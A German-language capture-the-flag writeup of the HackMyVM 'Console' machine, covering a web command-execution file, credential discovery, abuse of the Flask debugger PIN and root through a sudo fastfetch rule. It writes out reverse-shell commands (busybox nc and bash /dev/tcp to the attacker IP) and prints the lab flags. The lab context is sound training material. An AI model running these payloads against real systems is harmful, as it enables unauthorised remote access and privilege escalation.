# Console - HackMyVM Writeup

![Console Icon](Console.png)

## Übersicht

*   **VM:** Console
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Console)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 25. Juni 2025
*   **Original-Writeup:** https://alientec1908.github.io/Console_HackMyVM_Medium/
*   **Autor:** Ben C.

---

**Disclaimer:**

Dieser Writeup dient ausschließlich zu Bildungszwecken und dokumentiert Techniken, die in einer kontrollierten Testumgebung (HackTheBox/HackMyVM) angewendet wurden. Die Anwendung dieser Techniken auf Systeme, für die keine ausdrückliche Genehmigung vorliegt, ist illegal und ethisch nicht vertretbar. Der Autor und der Ersteller dieses README übernehmen keine Verantwortung für jeglichen Missbrauch der hier beschriebenen Informationen.

---

## Zusammenfassung

Die Box "Console" stellte eine vielschichtige Herausforderung dar, beginnend mit einer ungewöhnlichen Web-Konfiguration. Nach der initialen Enumeration der offenen Ports (SSH, HTTP, HTTPS) wurde festgestellt, dass der Zugriff auf die HTTPS-Seite (Port 443) durch eine 403 Forbidden-Fehlermeldung blockiert war. Eine Web-Bypass-Technik ermöglichte jedoch den Zugang. Auf der Webseite wurde eine Command Execution-Schwachstelle gefunden, die eine erste Shell als `www-data` ermöglichte.

Von der `www-data`-Shell aus wurden Systeminformationen gesammelt und Dateiberechtigungen sowie Home-Verzeichnisse erkundet. Dabei wurde ein Passwort für den Benutzer `welcome` in dessen `.viminfo`-Datei gefunden. Mit diesen Anmeldedaten konnte der Benutzer gewechselt werden (`su welcome`) und anschließend mittels einer erlaubten `sudo`-Regel der Flask-Anwendungs-Log gelesen werden, welcher den Debugger-PIN enthielt.

Über einen SSH-Tunnel wurde auf die lokal laufende Flask-Anwendung zugegriffen und die Debugger-Konsole mithilfe des Pins aktiviert. Dies ermöglichte die Ausführung beliebigen Python-Codes, was zu einer Shell als Benutzer `qaq` führte.

Die finale Privilegieneskalation von `qaq` zu `root` wurde durch eine weitere `sudo`-Regel ermöglicht, die `qaq` erlaubte, das Binary `/usr/bin/fastfetch` als Root ohne Passwort auszuführen. Dieses Binary besaß eine Kommando-Ausführungsfunktion, die für die Root-Shell ausgenutzt wurde.

## Technische Details

*   **Betriebssystem:** Debian (basierend auf Nmap-Erkennung und SSH-Banner)
*   **Offene Ports:**
    *   `22/tcp`: SSH (OpenSSH 8.4p1)
    *   `80/tcp`: HTTP (Apache httpd 2.4.62)
    *   `443/tcp`: SSL/HTTP (Apache httpd 2.4.62)
    *   `5000/tcp`: (Gefiltert durch Firewall, wird später via SSH-Tunneling zugreifbar)

## Enumeration

1.  **ARP-Scan:** Identifizierung der Ziel-IP (192.168.2.61) im Netzwerk.
2.  **Nmap Scan:** Ermittlung offener Ports und Dienste. Ports 22, 80 und 443 waren offen. Port 5000 war gefiltert.
3.  **Web Enumeration (Port 80 & 443):**
    *   Standard-Zugriff auf Port 80 zeigt eine Webseite.
    *   Zugriff auf Port 443 (`https://192.168.2.61/`) führt zu einem 403 Forbidden. Der Nmap Scan zeigte, dass das SSL-Zertifikat für `hacker.maze-sec.hmv` ausgestellt war.
    *   `403-bypass.sh` wurde verwendet und zeigte, dass der 403-Fehler umgangen werden kann, z.B. durch das Ändern des HTTP-Schemas im Request.
    *   Durch Hinzufügen von `hacker.maze-sec.hmv` zur `/etc/hosts` und Zugriff via `https://hacker.maze-sec.hmv/` wurde die Webseite auf Port 443 zugänglich.
    *   Nikto Scan auf `https://hacker.maze-sec.hmv/` zeigte Directory Indexing auf `/css/` und `/img/`.
    *   Die Analyse des Webseiten-Contents und des Nikto Scans deuteten auf eine verborgene Funktionalität oder Schwachstelle hin ("黑客的窗口" - "Hacker's Window", chinesischer Text, möglicherweise eine Command Execution in Verbindung mit einem "Console"-Input). Eine Datei namens `supercoool.php` im Web-Root (`/var/www/hacker.maze-sec.hmv`) wurde gefunden, die eine einfache command execution via `$GET['cmd']` ermöglichte.

## Initialer Zugriff (www-data Shell)

1.  **Command Execution:** Die gefundene Datei `supercoool.php` konnte über `https://hacker.maze-sec.hmv/supercoool.php?cmd=` mit Befehlen versorgt werden.
2.  **Reverse Shell:** Mittels `busybox nc ANGREIFER_IP 80 -e /bin/sh` (oder einer ähnlichen busybox/netcat-Payload) konnte eine Reverse Shell zum Angreifer auf Port 80 (oder 443, je nach verfügbarer Ausgehender Verbindung) etabliert werden.
3.  **Ergebnis:** Eine Shell wurde als Benutzer `www-data` empfangen.

## Lateral Movement (www-data -> welcome -> qaq)

1.  **Systemerkundung als `www-data`:** Nach Erhalt der `www-data`-Shell wurde das Dateisystem und Benutzerverzeichnisse erkundet. Die `/etc/passwd` offenbarte die Benutzer `welcome` und `qaq`.
2.  **Passwortfund für `welcome`:** Im Home-Verzeichnis des Benutzers `welcome` (`/home/welcome/`), welches für `www-data` lesbar war, wurde die Datei `.viminfo` gefunden. Diese enthielt das Passwort `welcome:welcome123`.
3.  **Wechsel zu Benutzer `welcome`:** Mit dem gefundenen Passwort konnte erfolgreich mittels `su welcome` zum Benutzer `welcome` gewechselt werden.
4.  **Sudo-Regel für `welcome`:** Als `welcome` wurde `sudo -l` ausgeführt. Es zeigte sich, dass `welcome` den Befehl `/bin/cat /opt/flask-app/logs/flask.log` als Benutzer `qaq` ohne Passwort ausführen durfte (`(qaq) NOPASSWD: /bin/cat /opt/flask-app/logs/flask.log`).
5.  **Flask Log auslesen:** Der Befehl `sudo -u qaq /bin/cat /opt/flask-app/logs/flask.log` wurde ausgeführt. Der Log enthielt kritische Informationen über die Flask-Anwendung: Debug-Modus aktiv (`Debug mode: on`), sie läuft auf `127.0.0.1:5000` und `192.168.2.62:5000`, und der Debugger-PIN (`Debugger PIN: 137-410-206`).

## Vertical Movement & Post-Exploitation (qaq Shell via Debugger)

1.  **SSH Port Forwarding:** Um auf die lokal laufende Flask-Anwendung auf Port 5000 zuzugreifen, wurde ein SSH-Tunnel von der Angreifer-Maschine zur Box als Benutzer `welcome` eingerichtet: `ssh -L 5000:127.0.0.1:5000 welcome@192.168.2.62`. Der lokale Port 5000 des Angreifers wurde auf `localhost:5000` der Box weitergeleitet.
2.  **Flask Anwendung Zugriff & SSTI:** Über den lokalen Port 5000 (Zugriff via `http://127.0.0.1:5000` auf der Angreifer-Maschine, obwohl die Screenshots 8080 zeigen, was eine weitere lokale Weiterleitung sein könnte, der entscheidende Zugriff ist auf den Flask-Port) konnte die Flask-Anwendung erreicht werden. Es wurde eine Server-Side Template Injection (SSTI) Schwachstelle entdeckt (getestet mit `{{1/0}}`).
3.  **Debugger Konsole:** Aus dem Flask-Log war bekannt, dass der Debugger aktiv ist und auf `/console` liegt. Durch den Zugriff auf `http://127.0.0.1:5000/console` wurde die Werkzeug Debugger Konsole erreicht.
4.  **Code-Ausführung im Debugger:** Mithilfe des im Log gefundenen Debugger-PINs (`137-410-206`) konnte beliebiger Python-Code ausgeführt werden.
5.  **Shell als `qaq`:** Durch die Ausführung von `import os; os.system("bash -c 'bash -i >& /dev/tcp/192.168.2.199/443 0>&1'")` in der Debugger-Konsole wurde eine Reverse Shell als der Benutzer gestartet, unter dem die Flask-Anwendung lief. Laut pspy-Output und `sudo -l` der welcome-Shell läuft die Flask-App unter UID 1001, was dem Benutzer `qaq` entspricht. Die Shell wurde auf dem Lauschport 443 des Angreifers empfangen.

## Privilegieneskalation (qaq -> root)

1.  **Sudo-Regel für `qaq`:** Als Benutzer `qaq` wurde erneut `sudo -l` ausgeführt. Es zeigte sich, dass `qaq` den Befehl `/usr/bin/fastfetch` als Root ohne Passwort ausführen durfte (`(ALL) NOPASSWD: /usr/bin/fastfetch`).
2.  **Fastfetch Schwachstelle:** Die Binary `/usr/bin/fastfetch` wurde auf Schwachstellen untersucht. Die Hilfe-Optionen (`--help`) zeigten, dass fastfetch beliebige Befehle über Optionen wie `--command-text` und `--command-shell` ausführen kann.
3.  **Root Shell:** Durch die Ausführung von `sudo -u root /usr/bin/fastfetch --structure "command" --command-text "bash -c 'bash -i >& /dev/tcp/192.168.2.199/443 0>&1'"` wurde fastfetch als Root gestartet, welches wiederum den übergebenen Reverse Shell Payload als Root ausführte.
4.  **Ergebnis:** Eine Root-Shell wurde auf dem Lauschport 443 des Angreifers empfangen.

## Flags

*   **user.txt:** `flag{user-376760a7c739a606d4f8d8340bad4184}` (Gefunden unter `/home/welcome/user.txt`)
*   **r00t.txt:** `flag{root-009de5ebccb9fdecce2c4ac893bca6fa}` (Gefunden unter `/root/r00t.txt`)

---
